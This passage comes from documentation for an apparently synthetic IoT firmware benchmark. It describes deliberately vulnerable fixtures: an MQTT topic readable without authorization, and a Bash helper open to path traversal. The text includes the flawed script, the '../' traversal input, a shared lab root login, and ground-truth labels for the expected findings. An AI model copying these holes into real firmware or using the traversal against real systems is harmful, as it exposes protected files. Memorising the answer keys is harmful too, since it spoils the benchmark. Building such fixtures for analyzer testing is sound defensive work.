`meta-iotbench/recipes-vulns/cwe862-mqtt-internal-files/`, with the local
Mosquitto broker and `/usr/bin/iotbench-mqtt-internal-files` publisher.
Active config `/etc/mosquitto/iotbench.conf` loads the public read ACL
`/etc/mosquitto/iotbench-public.acl` on guest TCP 1883 and local write ACL
`/etc/mosquitto/iotbench-publish.acl` on guest-loopback TCP 1884.
Startup uses `iotbench-mqtt-internal-files.service` and the
`mosquitto.service.d/10-iotbench-listener.conf` drop-in under
`/usr/lib/systemd/system/`. The publisher runs as locked `mqttfixture` UID/GID
991; the existing telemetry drop-in is described in the shared configuration.
Source annotation, ground truth and NOTICE are under
`/usr/share/iotbench/mqtt-internal-files/`.

Static mapping: `device/config` exposes
`/usr/share/iotbench/mqtt-internal-files/internal/device.conf`, containing
`device_class=thermostat`, a fake asset reference, calibration profile and diagnostic
mode. `maintenance/info` exposes
`/usr/share/iotbench/mqtt-internal-files/internal/maintenance.dat`, containing
a synthetic maintenance reference, service window and self-test state.
Both files are internal-maintenance-only, root:mqttfixture `0640` inside `0750`.
They should require maintenance authorization; they are not public telemetry.

Vulnerable flow: **internal synthetic file → `read_internal()` / `openat` /
`read` → `publish_files()` / `mosquitto_publish()` → corresponding retained
MQTT topic → anonymous subscriber allowed by public ACL**.
The intentionally insufficient check is the unconditional anonymous read grant
for both private topics, with no maintenance identity/role restriction.
Expected static finding: correlate those fixed firmware files, read-to-publish
flow and active anonymous ACL. Ground-truth label: **MQTT Server Communicating
with Vulnerable Internal Files**, **CWE-862 — Missing Authorization**.
Safe remediation: remove the two public read grants or authorize authenticated
maintenance subscribers for each topic, preserving fixed read-only mapping.

Local build and boot (host repository root):

~~~bash
FIRMWARE=thermostat-cwe862-mqtt-internal-files docker compose run --rm yocto
FIRMWARE=thermostat-cwe862-mqtt-internal-files ./scripts/run-qemu.sh
~~~

Local test (second host terminal, no credential):

~~~bash
python3 scripts/test-mqtt-internal-files.py --get device/config
python3 scripts/test-mqtt-internal-files.py --get maintenance/info
python3 scripts/test-mqtt-internal-files.py --device thermostat
~~~

Expected: exact internal bytes, `device_class=thermostat` and
`MQTT_INTERNAL_CONFIG_EXPOSED` on `device/config`, plus
`MQTT_INTERNAL_MAINTENANCE_EXPOSED` on `maintenance/info`. Use
`python3 scripts/test-mqtt-internal-files.py --boot thermostat` separately from manual
QEMU for file-origin, rejection and restart checks in a disposable snapshot.
To inspect this firmware offline:

~~~bash
docker compose run --rm yocto python3 /scripts/test-mqtt-internal-files.py \
  --image /export/thermostat-cwe862-mqtt-internal-files/qemuarm64/iotbench-thermostat-cwe862-mqtt-internal-files-qemuarm64.rootfs.ext4.zst
~~~

## Vulnerable Bash Files — Path Traversal

### Build, boot and manual testing

**What this tests.** The Bash script concatenates the requested filename with
`data/` without blocking `../`. This allows reading a synthetic internal file
outside the intended directory while staying within the lab's containment.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe022-bash-path-traversal docker compose run --rm yocto
QEMU_HTTP_PORT=18080 FIRMWARE=router-cwe022-bash-path-traversal ./scripts/run-qemu.sh
```

**Test — guest:**

```sh
iotbench-bash-read public.txt
echo "exit=$?"
iotbench-bash-read '../internal/private-fixture.txt'
echo "exit=$?"
iotbench-bash-read missing.txt
echo "exit=$?"
```

Expected: the first command shows `SYNTHETIC_PUBLIC_FIXTURE_DATA` and `exit=0`;
the command using `../` shows `SYNTHETIC_INTERNAL_FIXTURE_DATA` and `exit=0`,
confirming traversal. The missing file returns no data and exits with `exit=1`.
The defect concerns path resolution in the Bash helper.

> INTENTIONALLY INSECURE SYNTHETIC TEST FIXTURE — LOCAL SECURITY TESTING ONLY — NOT FOR DEPLOYMENT

### Scenario and expected ground truth

The eleven `<device>-cwe022-bash-path-traversal` firmware images reuse the common image,
existing device profiles, native services, peripheral simulator, pinned Yocto
layers and build/export scripts. Each installs exactly one vulnerability
package, `cwe022-bash-path-traversal`, with a local Bash helper and synthetic data.

The exact expected ground-truth label is **Vulnerable Bash files — Path
Traversal**; the weakness is **CWE-22 — Path Traversal**. The vulnerability is
specifically **Path Traversal in a Bash firmware helper caused by concatenating
user-controlled path input with an intended base directory without sufficient
canonicalization or boundary validation**. The local caller controls the
helper's first argument. No network input or additional service is needed.

`/usr/bin/iotbench-bash-read` has an actual `#!/bin/bash` interpreter and an
explicit `bash` runtime dependency. Its vulnerable flow is:

~~~bash
BASE_DIR='/usr/share/iotbench/bash-path-traversal/data/'
INPUT="$1"
TARGET="${BASE_DIR}${INPUT}"
# No canonicalization, normalization or data/ boundary validation.
while IFS= read -r line || [[ -n "$line" ]]; do
    printf '%s\n' "$line"
done < "$TARGET"
~~~

A representative positive is:

~~~text
input "../internal/private-fixture.txt"
→ /usr/share/iotbench/bash-path-traversal/data/../internal/private-fixture.txt
→ synthetic internal file read
→ SYNTHETIC_INTERNAL_FIXTURE_DATA
~~~

The kernel resolves `data/..` to the parent directory, so `internal/` is a
sibling of `data/`, outside the intended directory. Bash does not require the
resolved target to stay under `BASE_DIR`. The `[[ -f "$TARGET" ]]` check only
requires a regular file; it is not traversal validation and accepts the
internal file. Input and redirection are quoted. Shell metacharacters in `$1`
remain literal filename bytes, with no `eval`, command substitution on input,
`sh -c`, arbitrary command execution or command injection. Reading and printing
use Bash builtins, without a subprocess, writes, networking or package manager.

Detection requires the complete relationship **Bash input + filesystem path
construction + intended base directory + missing traversal validation +
filesystem access outside that intended directory**. Merely accepting an
argument or reading a file is insufficient. An analyzer should trace `$1` to
`INPUT`, then `TARGET`, and to the quoted redirection / `read` sink, identify the
absent `data/` boundary check, and correlate the sibling synthetic file.
`ground-truth.json` records the expected finding; it is not a substitute for
analyzing the actual installed Bash script.

These fixtures differ from generic vulnerable Java/JAR applications and
generic vulnerable C binaries because the actual vulnerable input-to-read flow
is in a Bash helper installed in every device firmware. They differ from
ordinary Bash scripts without attacker-controlled paths and generic fixed-name
file readers because the first argument selects the constructed target. They
differ from command injection and arbitrary command-execution examples because
input is used only as a quoted filesystem path. They differ from unsafe sudo
helper examples because no sudo rule, privileged read grant or SUID is added.
They differ from Path Traversal in unrelated applications because the firmware
Bash helper is the measured source and sink.

### Filesystem layout and independent lab containment

The repository convention is `/usr/bin` for local helpers and
`/usr/share/iotbench/<scenario>` for local fixture assets. Sources are under
`meta-iotbench/recipes-vulns/cwe022-bash-path-traversal/`; all local `file://` inputs
are deterministic. No new firmware architecture or device profile is created.

| Artifact | Firmware path / role |
| --- | --- |
| Vulnerable Bash helper | `/usr/bin/iotbench-bash-read`, root:root `0755` |
| Intended base directory, as seen by the confined helper | `/usr/share/iotbench/bash-path-traversal/data/` |
| Intended file, as seen by the confined helper | `/usr/share/iotbench/bash-path-traversal/data/public.txt`; `SYNTHETIC_PUBLIC_FIXTURE_DATA` |
| Internal file, as seen by the confined helper | `/usr/share/iotbench/bash-path-traversal/internal/private-fixture.txt`; `SYNTHETIC_INTERNAL_FIXTURE_DATA` |
| Fixed outer process root | `/usr/share/iotbench/bash-path-traversal/rootfs/` |
| Public file in the extracted firmware | `/usr/share/iotbench/bash-path-traversal/rootfs/usr/share/iotbench/bash-path-traversal/data/public.txt`, root:root `0644` |
| Internal file in the extracted firmware | `/usr/share/iotbench/bash-path-traversal/rootfs/usr/share/iotbench/bash-path-traversal/internal/private-fixture.txt`, root:root `0644` |
| Safe loadable Bash builtin | `/usr/lib/iotbench/bash-path-traversal/fixture-confine.so`, root:root `0755` |
| Analysis metadata / notice / guest regression | `ground-truth.json`, `NOTICE`, `test-guest.sh` under `/usr/share/iotbench/bash-path-traversal/` |
| Containment source for inspection | `/usr/share/iotbench/bash-path-traversal/fixture-confine.c` |

The helper first loads `fixture_confine` into the already initialized Bash
process and invokes it with **no arguments**. The builtin enters only the
fixed outer `rootfs/`, sets its working directory to `/`, removes supplementary
groups, permanently drops to UID/GID `990:990` and forbids new privileges.
No account, password, privileged login or permission grant is created. A
non-root caller cannot perform confinement and is rejected; run tests from the
existing guest root serial console. Partial confinement failure terminates
the process before any user-controlled file read.

This small C module has no `main()`, never reads files, never receives the
supplied path and never constructs or validates `TARGET`. It is solely a safe
Bash loadable confinement builtin, compiled against the pinned Bash headers
using Yocto's normal cross compiler. It does not launch Bash or another shell;
it executes inside the existing interpreter. Its source is installed for
analysis. The package's MIT/GPL-compatible licensing is recorded in the recipe.

The jail contains **only the two synthetic regular files and root-owned `0755`
directories**. It has no executables, libraries, symlinks, device nodes,
`/proc`, host mounts or system files. Bash and the builtin are loaded before
the root change; all later operations are interpreter builtins. Even many
`../` segments cannot leave that process root. Both synthetic files remain
readable after dropping privileges. The word "private" describes the intended
application directory boundary, not a root-only permissions scenario.

This is containment of the entire lab, **not** enforcement of the intended
`data/` boundary. It leaves `../internal/private-fixture.txt` vulnerable and
adds none of the prohibited vulnerable-path mitigations: no `realpath`,
`readlink -f`, canonical path comparison, rejection of `..`, filename allowlist
or basename-only enforcement. The image postprocess asserts the two-file jail
layout and ordinary permissions, and appends the exact NOTICE to `/etc/motd`.
The helper prints the warning on each invocation. No host paths, real secrets,
credentials, persistence or system security setting changes are part of it.

### Shared local build and testing

Run host commands from the repository root. Default machine: `qemuarm64`.
Use `YOCTO_MACHINE` consistently for the existing other supported architectures.
Parse and resolve dependencies with the existing builder:

~~~bash
docker compose run --rm yocto bash -lc \
  'source /opt/yocto/yocto-env.sh && bitbake -p && bitbake -n iotbench-router-cwe022-bash-path-traversal'
~~~

Build all eleven fixtures:

~~~bash
for recipe in meta-iotbench/recipes-images/iotbench-*-cwe022-bash-path-traversal.bb; do
    firmware=$(basename "$recipe" .bb)
    FIRMWARE="${firmware#iotbench-}" docker compose run --rm yocto || exit 1
done
~~~

Exports use `deploy-images/<device>-cwe022-bash-path-traversal/<machine>/` and the
existing `scripts/build-all.sh` automatically includes all new image recipes.
For manual testing, boot the selected firmware with `scripts/run-qemu.sh` and
log into its serial console with the common lab `root` / `routeradmin` login.
Run only **inside the guest**:

~~~bash
iotbench-bash-read public.txt
iotbench-bash-read '../internal/private-fixture.txt'
sh /usr/share/iotbench/bash-path-traversal/test-guest.sh router
~~~

Expected: exact warning followed by public marker; then warning followed by
internal marker; then five `PASS` lines and status zero. Missing or non-regular
files return 1, and incorrect argument count or failed confinement returns 2.
The guest regression verifies normal reads, two traversal spellings, argument
counts, missing/directory paths, literal shell-shaped filenames, deep traversal
containment and ordinary helper permissions. Its outside-jail probes reference
only this fixture's synthetic NOTICE and data, never real system secrets.
It checks that the jail has exactly two files and no symlinks or special files.
The helper and regression do not mutate files.

`scripts/test-bash-path-traversal.py --image <ext4-or-ext4.zst>` uses `debugfs`
without mounting or executing the firmware. It verifies the exact installed
Bash/source/test/metadata, actual Bash interpreter, fixed confinement ELF,
recursive jail contents and ownership, file bytes, ancestors and warning.
Expected: two `PASS` lines. Use the builder's installed tools as in the
per-device commands below.

For automatic disposable guest boots, separately from manually running QEMU:

~~~bash
python3 scripts/test-bash-path-traversal.py --device router
python3 scripts/test-bash-path-traversal.py --all
# Optional Apple Silicon acceleration and unused existing device-service ports:
QEMU_ACCEL=hvf QEMU_CPU=host QEMU_HTTP_PORT=18080 \
  QEMU_MQTT_PORT=21883 QEMU_MODBUS_PORT=11502 \
  python3 scripts/test-bash-path-traversal.py --all
~~~

The runner needs host QEMU and `zstd`, boots one snapshot at a time, invokes
the regression over the serial console and closes QEMU. Logs are saved beside
each export as `validation-console.log`. The path-traversal helper uses no
networking; port settings support only the unchanged device profiles.

### Safe remediation

In a separate corrected variant, resolve the supplied path relative to a trusted
`data/` directory and enforce that the resolved file remains inside it. Reject
absolute paths and escaping traversal; account for symlinks and filesystem
races, preferably using directory-relative opens with resolution constraints.
A lexical prefix comparison alone is insufficient. Keep quoted input and
read-only behavior, ordinary file permissions and the outer synthetic jail.
Rebuild for a lasting variant; do not add the fix to these known-positive
vulnerable fixtures. A corrected variant must still read `public.txt` but reject
`../internal/private-fixture.txt` without printing the internal marker. The
vulnerable fixture's positive traversal assertion must fail against that fix.

### Completed validation

On 2026-10-07, all eleven `qemuarm64` firmware fixtures built and exported
successfully after BitBake layer parsing and a router dependency dry run.
Every image manifest contains exactly one vulnerability package,
`cwe022-bash-path-traversal`, plus the actual Bash runtime and its existing
device profile. No other vulnerability package was added.

Offline `debugfs` inspection of all eleven compressed ext4 exports verified
exact installed Bash, confinement source, guest regression and ground truth;
the fixed confinement ELF; the actual Bash interpreter; device identity;
ordinary root:root `0755` helper/builtin permissions; root:root `0644` synthetic
files; safe ancestor directories; recursive two-file jail contents with no
symlinks or special files; and the required NOTICE/login warning. Installed
Bash helper and confinement builtin bytes are identical across all images.

All eleven images booted in disposable QEMU snapshots with HVF/host CPU and
passed all five guest regression groups: intended public-file read, two `../`
traversal spellings reading the synthetic internal marker, invalid arguments
and literal shell-shaped filenames, deep traversal remaining inside the
synthetic-only jail, and ordinary permissions without SUID or sudo grants.
Tests used the local serial console and existing host-loopback device-service
ports HTTP `18080`, MQTT `21883` and PLC Modbus `11502`. The Bash helper itself
uses no networking and neither it nor the guest regression modifies files.

The [local validation report](../deploy-images/bash-path-traversal-qemuarm64-validation.txt)
records all 55 guest checks and compressed-rootfs/kernel/manifest/console/source
SHA-256 checksums. Each export includes `rootfs.manifest` and
`validation-console.log`; aggregate logs are saved under
`deploy-images/bash-path-traversal-qemuarm64-*`. Other supported architectures
were not built or boot-tested. No external firmware-analysis engine was run;
the static finding is expected ground truth supported by the installed Bash
flow and observed local traversal behavior.

### Bash Path Traversal — doorlock

Simulated device: **access-control door lock**, using the existing
`meta-iotbench/recipes-devices/doorlock/` profile. Firmware directory:
`deploy-images/doorlock-cwe022-bash-path-traversal/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-doorlock-cwe022-bash-path-traversal.bb`. The default export is
`deploy-images/doorlock-cwe022-bash-path-traversal/qemuarm64/iotbench-doorlock-cwe022-bash-path-traversal-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` in the same directory. Its sole vulnerability package is
`cwe022-bash-path-traversal`.

Vulnerable Bash script: `/usr/bin/iotbench-bash-read`. Intended base directory
inside the confined process: `/usr/share/iotbench/bash-path-traversal/data/`.
Relevant synthetic files: `data/public.txt` and `internal/private-fixture.txt`
under `/usr/share/iotbench/bash-path-traversal/` as seen by the helper; in the extracted
firmware they are under `/usr/share/iotbench/bash-path-traversal/rootfs/usr/share/iotbench/bash-path-traversal/`.
The internal file contains **`SYNTHETIC_INTERNAL_FIXTURE_DATA`** and is outside
`data/`. NOTICE, ground truth and the guest test live outside the jail under
`/usr/share/iotbench/bash-path-traversal/`.

The input is the first script argument (`$1`), assigned to `INPUT`. The exact
path construction is `TARGET="${BASE_DIR}${INPUT}"`. There is intentionally no
canonicalization, normalization or intended-directory validation between this
assignment and `done < "$TARGET"`. The benign read-only operation is a Bash
`read -r` loop that prints each line with `printf`. `[[ -f ]]` only checks file
type; it does not restrict the path to `data/`.

Representative vulnerable flow and expected static-analysis data flow:

~~~text
$1 = "../internal/private-fixture.txt" → INPUT
→ TARGET = /usr/share/iotbench/bash-path-traversal/data/../internal/private-fixture.txt
→ quoted Bash input redirection / read builtin
→ synthetic internal file read: SYNTHETIC_INTERNAL_FIXTURE_DATA
~~~

`data/..` resolves to its parent, so `internal/` escapes the intended base.
Expected finding: **CWE-22**, correlate Bash-controlled path construction with
the missing `data/` boundary check and reachable sibling file. Expected exact
ground-truth label: **Vulnerable Bash files — Path Traversal**. The fixed
input-independent jail contains the lab as a whole while preserving this escape.
Safe remediation: enforce resolved containment inside `data/`, including
symlink/race protection, preserve quoting and outer confinement, and verify
public reads still work while traversal is rejected.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=doorlock-cwe022-bash-path-traversal docker compose run --rm yocto
FIRMWARE=doorlock-cwe022-bash-path-traversal ./scripts/run-qemu.sh
~~~

Local test, inside this guest's root serial console:

~~~bash
iotbench-bash-read public.txt
iotbench-bash-read '../internal/private-fixture.txt'
sh /usr/share/iotbench/bash-path-traversal/test-guest.sh doorlock
~~~

Expected: public marker, internal marker, then five `PASS` lines; zero status.
No host or real system file is used. Offline verification (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-bash-path-traversal.py \
  --image /export/doorlock-cwe022-bash-path-traversal/qemuarm64/iotbench-doorlock-cwe022-bash-path-traversal-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. Automatic disposable guest test, separately from
manual QEMU:

~~~bash
python3 scripts/test-bash-path-traversal.py --device doorlock
~~~

### Bash Path Traversal — envsensor

Simulated device: **environmental sensor**, using the existing
`meta-iotbench/recipes-devices/envsensor/` profile. Firmware directory:
`deploy-images/envsensor-cwe022-bash-path-traversal/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-envsensor-cwe022-bash-path-traversal.bb`. The default export is
`deploy-images/envsensor-cwe022-bash-path-traversal/qemuarm64/iotbench-envsensor-cwe022-bash-path-traversal-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` in the same directory. Its sole vulnerability package is
`cwe022-bash-path-traversal`.

Vulnerable Bash script: `/usr/bin/iotbench-bash-read`. Intended base directory
inside the confined process: `/usr/share/iotbench/bash-path-traversal/data/`.
Relevant synthetic files: `data/public.txt` and `internal/private-fixture.txt`
under `/usr/share/iotbench/bash-path-traversal/` as seen by the helper; in the extracted
firmware they are under `/usr/share/iotbench/bash-path-traversal/rootfs/usr/share/iotbench/bash-path-traversal/`.
The internal file contains **`SYNTHETIC_INTERNAL_FIXTURE_DATA`** and is outside
`data/`. NOTICE, ground truth and the guest test live outside the jail under
`/usr/share/iotbench/bash-path-traversal/`.

The input is the first script argument (`$1`), assigned to `INPUT`. The exact
path construction is `TARGET="${BASE_DIR}${INPUT}"`. There is intentionally no
canonicalization, normalization or intended-directory validation between this
assignment and `done < "$TARGET"`. The benign read-only operation is a Bash
`read -r` loop that prints each line with `printf`. `[[ -f ]]` only checks file
type; it does not restrict the path to `data/`.

Representative vulnerable flow and expected static-analysis data flow:

~~~text
$1 = "../internal/private-fixture.txt" → INPUT
→ TARGET = /usr/share/iotbench/bash-path-traversal/data/../internal/private-fixture.txt
→ quoted Bash input redirection / read builtin
→ synthetic internal file read: SYNTHETIC_INTERNAL_FIXTURE_DATA
~~~

`data/..` resolves to its parent, so `internal/` escapes the intended base.
Expected finding: **CWE-22**, correlate Bash-controlled path construction with
the missing `data/` boundary check and reachable sibling file. Expected exact
ground-truth label: **Vulnerable Bash files — Path Traversal**. The fixed
input-independent jail contains the lab as a whole while preserving this escape.
Safe remediation: enforce resolved containment inside `data/`, including
symlink/race protection, preserve quoting and outer confinement, and verify
public reads still work while traversal is rejected.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=envsensor-cwe022-bash-path-traversal docker compose run --rm yocto
FIRMWARE=envsensor-cwe022-bash-path-traversal ./scripts/run-qemu.sh
~~~

Local test, inside this guest's root serial console:

~~~bash
iotbench-bash-read public.txt
iotbench-bash-read '../internal/private-fixture.txt'
sh /usr/share/iotbench/bash-path-traversal/test-guest.sh envsensor
~~~

Expected: public marker, internal marker, then five `PASS` lines; zero status.
No host or real system file is used. Offline verification (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-bash-path-traversal.py \
  --image /export/envsensor-cwe022-bash-path-traversal/qemuarm64/iotbench-envsensor-cwe022-bash-path-traversal-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. Automatic disposable guest test, separately from
manual QEMU:

~~~bash
python3 scripts/test-bash-path-traversal.py --device envsensor
~~~

### Bash Path Traversal — healthmonitor

Simulated device: **health monitor**, using the existing
`meta-iotbench/recipes-devices/healthmonitor/` profile. Firmware directory:
`deploy-images/healthmonitor-cwe022-bash-path-traversal/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-healthmonitor-cwe022-bash-path-traversal.bb`. The default export is
`deploy-images/healthmonitor-cwe022-bash-path-traversal/qemuarm64/iotbench-healthmonitor-cwe022-bash-path-traversal-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` in the same directory. Its sole vulnerability package is
`cwe022-bash-path-traversal`.

Vulnerable Bash script: `/usr/bin/iotbench-bash-read`. Intended base directory
inside the confined process: `/usr/share/iotbench/bash-path-traversal/data/`.
Relevant synthetic files: `data/public.txt` and `internal/private-fixture.txt`
under `/usr/share/iotbench/bash-path-traversal/` as seen by the helper; in the extracted
firmware they are under `/usr/share/iotbench/bash-path-traversal/rootfs/usr/share/iotbench/bash-path-traversal/`.
The internal file contains **`SYNTHETIC_INTERNAL_FIXTURE_DATA`** and is outside
`data/`. NOTICE, ground truth and the guest test live outside the jail under
`/usr/share/iotbench/bash-path-traversal/`.

The input is the first script argument (`$1`), assigned to `INPUT`. The exact
path construction is `TARGET="${BASE_DIR}${INPUT}"`. There is intentionally no
canonicalization, normalization or intended-directory validation between this
assignment and `done < "$TARGET"`. The benign read-only operation is a Bash
`read -r` loop that prints each line with `printf`. `[[ -f ]]` only checks file
type; it does not restrict the path to `data/`.

Representative vulnerable flow and expected static-analysis data flow:

~~~text
$1 = "../internal/private-fixture.txt" → INPUT
→ TARGET = /usr/share/iotbench/bash-path-traversal/data/../internal/private-fixture.txt
→ quoted Bash input redirection / read builtin
→ synthetic internal file read: SYNTHETIC_INTERNAL_FIXTURE_DATA
~~~

`data/..` resolves to its parent, so `internal/` escapes the intended base.
Expected finding: **CWE-22**, correlate Bash-controlled path construction with
the missing `data/` boundary check and reachable sibling file. Expected exact
ground-truth label: **Vulnerable Bash files — Path Traversal**. The fixed
input-independent jail contains the lab as a whole while preserving this escape.
Safe remediation: enforce resolved containment inside `data/`, including
symlink/race protection, preserve quoting and outer confinement, and verify
public reads still work while traversal is rejected.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=healthmonitor-cwe022-bash-path-traversal docker compose run --rm yocto
FIRMWARE=healthmonitor-cwe022-bash-path-traversal ./scripts/run-qemu.sh
~~~

Local test, inside this guest's root serial console:

~~~bash
iotbench-bash-read public.txt
iotbench-bash-read '../internal/private-fixture.txt'
sh /usr/share/iotbench/bash-path-traversal/test-guest.sh healthmonitor
~~~

Expected: public marker, internal marker, then five `PASS` lines; zero status.
No host or real system file is used. Offline verification (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-bash-path-traversal.py \
  --image /export/healthmonitor-cwe022-bash-path-traversal/qemuarm64/iotbench-healthmonitor-cwe022-bash-path-traversal-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. Automatic disposable guest test, separately from
manual QEMU:

~~~bash
python3 scripts/test-bash-path-traversal.py --device healthmonitor
~~~

### Bash Path Traversal — ipcamera

Simulated device: **surveillance IP camera**, using the existing
`meta-iotbench/recipes-devices/ipcamera/` profile. Firmware directory:
`deploy-images/ipcamera-cwe022-bash-path-traversal/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-ipcamera-cwe022-bash-path-traversal.bb`. The default export is
`deploy-images/ipcamera-cwe022-bash-path-traversal/qemuarm64/iotbench-ipcamera-cwe022-bash-path-traversal-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` in the same directory. Its sole vulnerability package is
`cwe022-bash-path-traversal`.

Vulnerable Bash script: `/usr/bin/iotbench-bash-read`. Intended base directory
inside the confined process: `/usr/share/iotbench/bash-path-traversal/data/`.
Relevant synthetic files: `data/public.txt` and `internal/private-fixture.txt`
under `/usr/share/iotbench/bash-path-traversal/` as seen by the helper; in the extracted
firmware they are under `/usr/share/iotbench/bash-path-traversal/rootfs/usr/share/iotbench/bash-path-traversal/`.
The internal file contains **`SYNTHETIC_INTERNAL_FIXTURE_DATA`** and is outside
`data/`. NOTICE, ground truth and the guest test live outside the jail under
`/usr/share/iotbench/bash-path-traversal/`.

The input is the first script argument (`$1`), assigned to `INPUT`. The exact
path construction is `TARGET="${BASE_DIR}${INPUT}"`. There is intentionally no
canonicalization, normalization or intended-directory validation between this
assignment and `done < "$TARGET"`. The benign read-only operation is a Bash
`read -r` loop that prints each line with `printf`. `[[ -f ]]` only checks file
type; it does not restrict the path to `data/`.

Representative vulnerable flow and expected static-analysis data flow:

~~~text
$1 = "../internal/private-fixture.txt" → INPUT
→ TARGET = /usr/share/iotbench/bash-path-traversal/data/../internal/private-fixture.txt
→ quoted Bash input redirection / read builtin
→ synthetic internal file read: SYNTHETIC_INTERNAL_FIXTURE_DATA
~~~

`data/..` resolves to its parent, so `internal/` escapes the intended base.
Expected finding: **CWE-22**, correlate Bash-controlled path construction with
the missing `data/` boundary check and reachable sibling file. Expected exact
ground-truth label: **Vulnerable Bash files — Path Traversal**. The fixed
input-independent jail contains the lab as a whole while preserving this escape.
Safe remediation: enforce resolved containment inside `data/`, including
symlink/race protection, preserve quoting and outer confinement, and verify
public reads still work while traversal is rejected.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=ipcamera-cwe022-bash-path-traversal docker compose run --rm yocto
FIRMWARE=ipcamera-cwe022-bash-path-traversal ./scripts/run-qemu.sh
~~~

Local test, inside this guest's root serial console:

~~~bash
iotbench-bash-read public.txt
iotbench-bash-read '../internal/private-fixture.txt'
sh /usr/share/iotbench/bash-path-traversal/test-guest.sh ipcamera
~~~

Expected: public marker, internal marker, then five `PASS` lines; zero status.
No host or real system file is used. Offline verification (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-bash-path-traversal.py \
  --image /export/ipcamera-cwe022-bash-path-traversal/qemuarm64/iotbench-ipcamera-cwe022-bash-path-traversal-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. Automatic disposable guest test, separately from
manual QEMU:

~~~bash
python3 scripts/test-bash-path-traversal.py --device ipcamera
~~~

### Bash Path Traversal — plc

Simulated device: **industrial PLC gateway (OT)**, using the existing
`meta-iotbench/recipes-devices/plc/` profile. Firmware directory:
`deploy-images/plc-cwe022-bash-path-traversal/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-plc-cwe022-bash-path-traversal.bb`. The default export is
`deploy-images/plc-cwe022-bash-path-traversal/qemuarm64/iotbench-plc-cwe022-bash-path-traversal-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` in the same directory. Its sole vulnerability package is
`cwe022-bash-path-traversal`.

Vulnerable Bash script: `/usr/bin/iotbench-bash-read`. Intended base directory
inside the confined process: `/usr/share/iotbench/bash-path-traversal/data/`.
Relevant synthetic files: `data/public.txt` and `internal/private-fixture.txt`
under `/usr/share/iotbench/bash-path-traversal/` as seen by the helper; in the extracted
firmware they are under `/usr/share/iotbench/bash-path-traversal/rootfs/usr/share/iotbench/bash-path-traversal/`.
The internal file contains **`SYNTHETIC_INTERNAL_FIXTURE_DATA`** and is outside
`data/`. NOTICE, ground truth and the guest test live outside the jail under
`/usr/share/iotbench/bash-path-traversal/`.

The input is the first script argument (`$1`), assigned to `INPUT`. The exact
path construction is `TARGET="${BASE_DIR}${INPUT}"`. There is intentionally no
canonicalization, normalization or intended-directory validation between this
assignment and `done < "$TARGET"`. The benign read-only operation is a Bash
`read -r` loop that prints each line with `printf`. `[[ -f ]]` only checks file
type; it does not restrict the path to `data/`.

Representative vulnerable flow and expected static-analysis data flow:

~~~text
$1 = "../internal/private-fixture.txt" → INPUT
→ TARGET = /usr/share/iotbench/bash-path-traversal/data/../internal/private-fixture.txt
→ quoted Bash input redirection / read builtin
→ synthetic internal file read: SYNTHETIC_INTERNAL_FIXTURE_DATA
~~~

`data/..` resolves to its parent, so `internal/` escapes the intended base.
Expected finding: **CWE-22**, correlate Bash-controlled path construction with
the missing `data/` boundary check and reachable sibling file. Expected exact
ground-truth label: **Vulnerable Bash files — Path Traversal**. The fixed
input-independent jail contains the lab as a whole while preserving this escape.
Safe remediation: enforce resolved containment inside `data/`, including
symlink/race protection, preserve quoting and outer confinement, and verify
public reads still work while traversal is rejected.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=plc-cwe022-bash-path-traversal docker compose run --rm yocto
FIRMWARE=plc-cwe022-bash-path-traversal ./scripts/run-qemu.sh
~~~

Local test, inside this guest's root serial console:

~~~bash
iotbench-bash-read public.txt
iotbench-bash-read '../internal/private-fixture.txt'
sh /usr/share/iotbench/bash-path-traversal/test-guest.sh plc
~~~

Expected: public marker, internal marker, then five `PASS` lines; zero status.
No host or real system file is used. Offline verification (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-bash-path-traversal.py \
  --image /export/plc-cwe022-bash-path-traversal/qemuarm64/iotbench-plc-cwe022-bash-path-traversal-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. Automatic disposable guest test, separately from
manual QEMU:

~~~bash
python3 scripts/test-bash-path-traversal.py --device plc
~~~

### Bash Path Traversal — router

Simulated device: **network gateway router**, using the existing
`meta-iotbench/recipes-devices/router/` profile. Firmware directory:
`deploy-images/router-cwe022-bash-path-traversal/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-router-cwe022-bash-path-traversal.bb`. The default export is
`deploy-images/router-cwe022-bash-path-traversal/qemuarm64/iotbench-router-cwe022-bash-path-traversal-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` in the same directory. Its sole vulnerability package is
`cwe022-bash-path-traversal`.

Vulnerable Bash script: `/usr/bin/iotbench-bash-read`. Intended base directory
inside the confined process: `/usr/share/iotbench/bash-path-traversal/data/`.
Relevant synthetic files: `data/public.txt` and `internal/private-fixture.txt`
under `/usr/share/iotbench/bash-path-traversal/` as seen by the helper; in the extracted
firmware they are under `/usr/share/iotbench/bash-path-traversal/rootfs/usr/share/iotbench/bash-path-traversal/`.
The internal file contains **`SYNTHETIC_INTERNAL_FIXTURE_DATA`** and is outside
`data/`. NOTICE, ground truth and the guest test live outside the jail under
`/usr/share/iotbench/bash-path-traversal/`.

The input is the first script argument (`$1`), assigned to `INPUT`. The exact
